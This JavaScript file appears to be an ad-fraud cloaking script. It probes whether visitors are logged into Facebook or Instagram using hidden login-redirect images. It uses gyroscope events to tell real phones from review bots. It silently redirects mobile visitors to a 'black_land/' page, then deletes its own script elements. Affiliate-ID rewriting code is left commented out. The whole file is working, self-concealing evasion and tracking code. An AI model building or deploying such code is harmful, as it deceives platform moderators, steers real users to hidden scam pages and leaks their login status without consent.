"use strict";

var arData = {
	facebook: {
		url: "https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.facebook.com%2Ffavicon.ico",
		name: "facebook"
	},

	instagram: {
		url: "https://www.instagram.com/accounts/login/?next=%2Ffavicon.ico",
		name: "instagram"
	},
};


var isMobile = {
	Android: function() {
		return navigator.userAgent.match(/Android/i);
	},
	BlackBerry: function() {
		return navigator.userAgent.match(/BlackBerry/i);
	},
	iOS: function() {
		return navigator.userAgent.match(/iPhone|iPad|iPod/i);
	},
	Opera: function() {
		return navigator.userAgent.match(/Opera Mini/i);
	},
	Windows: function() {
		return navigator.userAgent.match(/IEMobile/i);
	},
	any: function() {
		return (isMobile.Android() || isMobile.BlackBerry() || isMobile.iOS() || isMobile.Opera() || isMobile.Windows());
	}
};


$(function(){
	var counter = 0;
	window.addEventListener('deviceorientation', onOrientationChange);

/*
	var arLinks = $("a");
	var pathname = document.location.search;
	var aff_id = pathname.replace(/.*aff_id=(.*)&.*fbid=(.*)&?/, "$1");
	var fbid = pathname.replace(/.*aff_id=(.*)&.*fbid=(.*)&?/, "$2");

	var hrefLink = $(arLinks[0]).attr("href");
	var resLink = hrefLink.replace(/(.*aff_id=)(.*)(&fbid=)(.*)(&events.*)/, "$1" + aff_id + "$3" + fbid + "$5");

	$("a").attr("href", resLink);
*/

	for (var key in arData) {
		var item = arData[key];
		var image = '<img class="icon-image" src="' + item.url + '" onload="refresh(\'' + item.name + '\')" onerror="error(\'' + item.name + '\')" style="display: none;" />';

		$("#include_data").append(image);
	} // for in


	$("#include_data").remove();
	$("#remove_script").remove();
});


function onOrientationChange(e) {
	var alpha = Math.round(e.alpha);
	var beta = Math.round(e.beta);
	var gamma = Math.round(e.gamma);

	showMessage("begin load system: giroscop");

	if((alpha || beta || gamma) && counter < 1){
		counter++;

		showMessage("end load system: giroscop");

		if(isMobile.any()){
			document.location.href = makeBlackUrl();
		} // if
	} // if
} // onOrientationChange


function refresh(system) {
	showMessage("refresh load system: " + system);

	if(isMobile.any()){
		document.location.href = makeBlackUrl();
	} // if
} // refresh


function error(system) {
	showMessage("error system: " + system);
} // error


function showMessage(text){
	// console.log(text);
	// alert(text);
} // showMessage


function makeBlackUrl(){
	var origin = document.location.origin;
	var pathname = document.location.pathname;
	var search = document.location.search;
	var directory = "black_land/";

	return origin + pathname + directory + search;
} // makeBlackUrl

